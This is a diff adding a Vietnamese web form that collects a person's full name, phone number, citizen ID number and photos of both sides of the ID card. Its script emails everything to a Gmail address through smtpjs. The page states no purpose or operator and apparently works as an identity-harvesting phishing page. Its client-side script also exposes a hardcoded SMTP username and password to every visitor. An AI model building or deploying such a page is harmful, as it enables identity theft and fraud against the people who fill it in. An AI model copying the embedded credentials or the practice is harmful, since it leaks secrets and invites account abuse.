@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gửi mail check thông tin</title>
+</head>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, sans-serif;
+    }
+
+    .main_container {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    #form_contact {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem;
+        width: 300px;
+    }
+
+    .form_control {
+        display: flex;
+        flex-direction: column;
+        gap: 5px;
+    }
+
+    .form_control label {
+        font-weight: bold;
+        font-size: 1.5rem;
+    }
+
+    .form_control input {
+        padding: 5px;
+        font-size: 1.5rem;
+        outline: none;
+        border-radius: 0.5rem;
+        border: 2px solid #ccc;
+    }
+
+    #form_contact button {
+        font-weight: bold;
+        padding: 5px;
+        font-size: 1.5rem;
+        outline: none;
+        border-radius: 0.5rem;
+        border: 2px solid #ccc;
+        background-color: grey;
+        opacity: 0.8;
+        color: white;
+        cursor: pointer;
+    }
+</style>
+
+<body>
+    <main class="main_container">
+        <h1 style="text-transform: uppercase;">Gửi thông tin check mail</h1>
+        <form onsubmit="onSubmit()" id="form_contact">
+            <div class="form_control">
+                <label for="fullname">Họ tên:</label>
+                <input type="text" id="fullname" name="fullname" placeholder="họ và tên" required>
+            </div>
+            <div class="form_control">
+                <label for="phone">Số điện thoại:</label>
+                <input type="number" id="phone" name="phone" placeholder="0xxxxxx" required>
+            </div>
+            <div class="form_control">
+                <label for="cmnd">Căn cước công dân:</label>
+                <input type="number" id="cmnd" name="cmnd" placeholder="xxxxxxxx" required>
+            </div>
+            <div class="form_control">
+                <label for="fileInput">Hình ảnh căn cước công dân 2 mặt:</label>
+                <input type='file' accept="image/*,video/*,.pdf,.txt,.html,.js,.css,.odt,.odp,.odf,.docx"
+                    name='fichiersSupp' id="fileInput" multiple onchange="convertFile()" />
+            </div>
+            <div id="image_result"></div>
+            <button type="submit" id="btn_submit">Gửi</button>
+        </form>
+    </main>
+
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+    <script>
+
+        let allConvertedFiles = [];
+
+        function convertFile() {
+            var reader;
+            var dataUri;
+            var file;
+            var files = document.getElementById('fileInput').files;
+            var image_result = document.getElementById('image_result');
+            image_result.innerHTML = '';
+            for (var i = 0; i < files.length; i++) {
+                file = files[i];
+                if (file.type.match('image.*')) {
+                    reader = new FileReader();
+                    reader.onload = function (e) {
+                        dataUri = e.target.result;
+                        var img = new Image();
+                        img.src = dataUri;
+                        img.width = 100;
+                        img.height = 100;
+                        image_result.appendChild(img);
+                        allConvertedFiles.push({
+                            name: file.name,
+                            data: dataUri
+                        });
+                    };
+                    reader.readAsDataURL(file);
+                } else {
+                    allConvertedFiles.push({
+                        name: file.name,
+                        data: file
+                    });
+                }
+            }
+
+            console.log(allConvertedFiles)
+
+        };
+
+        function onSubmit() {
+            event.preventDefault();
+            let fullname = document.getElementById('fullname').value;
+            let phone = document.getElementById('phone').value;
+            let cmnd = document.getElementById('cmnd').value;
+            let btn_submit = document.getElementById('btn_submit');
+            // let image = document.getElementById('image').files[0];
+
+            const body = `
+            <h1>Thông tin người dùng</h1>
+            <h2>Họ tên: ${fullname}</h2>
+            <h2>Số điện thoại: ${phone}</h2>
+            <h2>Căn cước công dân: ${cmnd}</h2>
+           
+            `;
+
+            btn_submit.disabled = true;
+            btn_submit.style.opacity = 0.5;
+            btn_submit.textContent = 'Đang gửi...';
+
+            Email.send({
+                Host: "smtp.elasticemail.com",
+                Username: "hosobvnb@gmail.com",
+                Password: "5D0F4CAEE88BCB4C71E6958CE183B40B6F6D",
+                To: 'hosobvnb@gmail.com',
+                From: "hosobvnb@gmail.com",
+                Subject: "This is the subject",
+                Attachments: allConvertedFiles,
+                Body: body
+            }).then((message) => {
+                console.log(message)
+                if (message === 'OK') {
+                    alert('Gửi thành công');
+                    allConvertedFiles = [];
+                    window.location.reload();
+                } else {
+                    alert('Có lỗi xảy ra');
+                    btn_submit.disabled = false;
+                    btn_submit.style.opacity = 1;
+                }
+            });
+        }
+    </script>
+
+
+
+</body>
+
+</html>
